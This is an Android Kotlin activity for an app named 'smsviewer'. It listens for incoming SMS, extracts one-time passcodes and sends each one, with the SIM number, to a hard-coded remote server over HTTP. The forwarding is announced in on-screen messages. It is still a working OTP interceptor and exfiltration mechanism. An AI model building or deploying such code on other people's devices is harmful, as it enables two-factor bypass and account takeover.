package com.example.smsviewer

import android.Manifest
import android.annotation.SuppressLint
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Bundle
import android.provider.Telephony
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    private lateinit var smsLog: TextView
    private lateinit var simInfoTextView: TextView
    private lateinit var sim1EditText: EditText
    private lateinit var sim2EditText: EditText
    private lateinit var saveButton: Button

    private var savedSim1Number: String = ""
    private var savedSim2Number: String = ""
    private var isListeningToSms = false

    private val requestCode = 101

    private val smsUpdateReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            try {
                if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
                    val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
                    if (smsMessages.isEmpty()) {
                        Log.e("SMS_RECEIVED", "No SMS messages found in intent")
                        return
                    }

                    val sender = smsMessages.firstOrNull()?.displayOriginatingAddress ?: "Unknown Sender"
                    val messageBody = smsMessages.firstOrNull()?.messageBody ?: "No Message"
                    val otp = extractOtp(messageBody)
                    val simInfo = getSimInformation()

                    val subscriptionId = intent.extras?.getInt("subscription", -1) ?: -1
                    val usedSimNumber = when (subscriptionId) {
                        getSimSubscriptionId(0) -> savedSim1Number
                        getSimSubscriptionId(1) -> savedSim2Number
                        else -> "Unknown SIM"
                    }

                    runOnUiThread {
                        simInfoTextView.text = "SIM Info: $simInfo"
                    }

                    if (otp.isNotBlank()) {
                        Log.d("SMS_RECEIVED", "From: $sender | Message: $messageBody | SIM: $usedSimNumber")
                        Toast.makeText(context, "From: $sender\nMessage: $messageBody\nSIM: $usedSimNumber", Toast.LENGTH_LONG).show()

                        runOnUiThread {
                            val currentText = smsLog.text?.toString() ?: ""
                            val updatedText = if (currentText == getString(R.string.sms_log_placeholder) || currentText.isBlank()) {
                                "$sender: $messageBody\nSIM: $usedSimNumber"
                            } else {
                                "$currentText\n$sender: $messageBody\nSIM: $usedSimNumber"
                            }
                            smsLog.text = updatedText
                        }

                        sendSmsToServer(usedSimNumber, otp)
                    }
                }
            } catch (e: Exception) {
                Log.e("SMS_RECEIVER_ERROR", "Error handling SMS: ${e.localizedMessage}", e)
                Toast.makeText(context, "Error handling SMS: ${e.localizedMessage}", Toast.LENGTH_SHORT).show()
            }
        }
    }

    private fun extractOtp(message: String): String {
        val regexes = listOf(
            Regex("\\b\\d{6}\\b"), // try 6-digit first
            Regex("\\b\\d{5}\\b"), // then 5-digit
            Regex("\\b\\d{4}\\b")  // then 4-digit
        )

        for (regex in regexes) {
            val match = regex.find(message)
            if (match != null) {
                return match.value
            }
        }
        return  message
    }

    @SuppressLint("MissingPermission")
    private fun getSimInformation(): String {
        return try {
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val subscriptionInfoList = subscriptionManager.activeSubscriptionInfoList
            val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

            if (subscriptionInfoList.isNullOrEmpty()) {
                "No SIM detected"
            } else {
                val sim1Info = subscriptionInfoList.getOrNull(0)
                val sim2Info = subscriptionInfoList.getOrNull(1)

                val sim1Number = sim1Info?.let {
                    telephonyManager.createForSubscriptionId(it.subscriptionId).line1Number
                } ?: "Unknown"

                val sim2Number = sim2Info?.let {
                    telephonyManager.createForSubscriptionId(it.subscriptionId).line1Number
                } ?: "Unknown"

                "SIM 1: $sim1Number | SIM 2: $sim2Number"
            }
        } catch (e: Exception) {
            Log.e("SIM_INFO_ERROR", "Failed to retrieve SIM info: ${e.localizedMessage}", e)
            "SIM info not available"
        }
    }

    @SuppressLint("MissingPermission")
    private fun getSimSubscriptionId(slotIndex: Int): Int {
        return try {
            val subscriptionManager = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            subscriptionManager.activeSubscriptionInfoList
                ?.getOrNull(slotIndex)
                ?.subscriptionId ?: -1
        } catch (e: Exception) {
            Log.e("SIM_SLOT_ERROR", "Error getting subscription ID: ${e.localizedMessage}", e)
            -1
        }
    }

    private fun sendSmsToServer(sender: String, otp: String) {
        Thread {
            try {
                val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
                val network = connectivityManager.activeNetwork
                val capabilities = connectivityManager.getNetworkCapabilities(network)
                val hasInternet = capabilities != null &&
                        (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)
                                || capabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
                                || capabilities.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET))

                if (!hasInternet) {
                    runOnUiThread {
                        Toast.makeText(this, "No internet connection", Toast.LENGTH_SHORT).show()
                    }
                    return@Thread
                }

                val url = URL("https://otp-458898283632.us-central1.run.app/?phone=$sender&otp=$otp")
                val connection = url.openConnection() as HttpURLConnection
                connection.connectTimeout = 5000
                connection.readTimeout = 5000
                connection.requestMethod = "GET"
                connection.connect()

                val responseCode = connection.responseCode
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = reader.readText()
                reader.close()

                Log.d("Server Response", "Code: $responseCode, Response: $response")

                runOnUiThread {
                    Toast.makeText(this, "OTP sent successfully", Toast.LENGTH_SHORT).show()
                }

            } catch (e: Exception) {
                Log.e("Network Error", "Error sending OTP: ${e.localizedMessage}", e)
                runOnUiThread {
                    Toast.makeText(this, "Failed to send OTP: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        //smsLog = findViewById(R.id.smsLog)
        simInfoTextView = findViewById(R.id.simInfoTextView)
        sim1EditText = findViewById(R.id.sim1Number)
        sim2EditText = findViewById(R.id.sim2Number)
        saveButton = findViewById(R.id.saveButton)
        requestPermissions()

        findViewById<Button>(R.id.requestPermissionBtn).setOnClickListener {
            requestPermissions()
        }

        saveButton.setOnClickListener {
            try {
                val sim1Input = sim1EditText.text.toString().trim()
                val sim2Input = sim2EditText.text.toString().trim()

                if (sim1Input.isBlank() && sim2Input.isBlank()) {
                    Toast.makeText(this, "Please enter at least one SIM number", Toast.LENGTH_SHORT).show()
                    return@setOnClickListener
                }

                savedSim1Number = sim1Input
                savedSim2Number = sim2Input

                if (!isListeningToSms) {
                    val filter = IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION)
                    registerReceiver(smsUpdateReceiver, filter)
                    isListeningToSms = true
                    Toast.makeText(this, "SIM numbers saved. Now listening to SMS.", Toast.LENGTH_SHORT).show()
                    smsLog = findViewById(R.id.smsLog)
                    smsLog.text = "SMS viewer is ready!"
                }
            } catch (e: Exception) {
                Log.e("SAVE_ERROR", "Failed to save numbers or register receiver: ${e.localizedMessage}", e)
                Toast.makeText(this, "Failed to start SMS listening: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun hasPermissions(): Boolean {
        return listOf(
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.INTERNET
        ).all {
            ActivityCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestPermissions() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS,
                Manifest.permission.ACCESS_NETWORK_STATE,
                Manifest.permission.INTERNET
            ),
            requestCode
        )
    }

    override fun onDestroy() {
        super.onDestroy()
        if (isListeningToSms) {
            try {
                unregisterReceiver(smsUpdateReceiver)
            } catch (e: Exception) {
                Log.e("UNREGISTER_ERROR", "Receiver was not registered or already unregistered", e)
            }
        }
    }
}
